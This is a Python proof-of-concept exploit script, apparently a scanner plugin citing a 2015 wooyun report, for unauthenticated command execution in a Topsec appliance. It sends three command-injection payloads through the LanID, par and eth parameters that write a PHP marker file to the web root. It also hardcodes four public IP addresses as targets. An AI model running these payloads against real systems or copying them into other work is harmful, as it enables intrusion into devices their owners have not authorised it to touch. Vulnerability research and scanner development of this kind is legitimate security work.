#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 天融信某系统前台无需登录命令执行3处
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0117621

"""

import urlparse
def assign(service, arg):
    if service == 'topsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
    payload = 'change_lan.php'
    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0'}
    raw='''POST / HTTP/1.1
Host: 61.148.24.182
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

LanID=1' | echo ' testvul' > testc.php | '
'''
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target,raw=raw);
    payload='testc.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvul' in res:
        security_hole(target)

        
    payload="acc/tools/enable_tool_debug.php?val=0&tool=1&par=172.0.0.1%27%20|%20echo%20testvul%20>%20testa.php%20|%20%27"
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target);
    payload='acc/tools/testa.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvul' in res:
        security_hole(target)

        
    payload='acc/network/getMacAddr.php?eth=%20|%20echo%20testvul%20>%20testb.php%20|'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    payload='acc/network/testb.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvul' in res:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec', 'http://61.54.222.33:8080/')[1])
    audit(assign('topsec', 'http://61.148.24.182/')[1])
    audit(assign('topsec', 'http://218.206.217.19:8080/')[1])
    audit(assign('topsec', 'http://61.54.222.39:8080/')[1])